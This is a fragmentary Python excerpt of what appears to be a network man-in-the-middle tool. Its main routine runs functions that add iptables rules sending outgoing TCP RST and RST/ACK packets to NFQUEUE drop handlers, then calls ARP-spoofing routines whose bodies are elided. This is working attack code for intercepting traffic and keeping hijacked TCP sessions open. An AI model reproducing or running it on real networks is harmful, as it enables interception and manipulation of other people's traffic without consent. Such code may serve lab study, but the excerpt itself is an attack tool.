...
def rst_cap():
    QUEUE_NUM = 0
    os.system("iptables -I OUTPUT -p tcp --tcp-flags RST RST -j NFQUEUE --queue-num 0")
    queue = NetfilterQueue()
    try:
            queue.bind(QUEUE_NUM, rst_drop)
            queue.run()
...
def rstack_cap():
        QUEUE_NUM = 1
        os.system("iptables -I OUTPUT -p tcp --tcp-flags RST,ACK RST,ACK -j NFQUEUE --queue-num 1")
        queue = NetfilterQueue()
        try:
                queue.bind(QUEUE_NUM, rst_drop)
                queue.run()
...
def main():
        p1 = Process(target=rst_cap)
        p2 = Process(target=rstack_cap)
        p1.start()
        p2.start()
        get_ipmac()
        arp_spoofing()
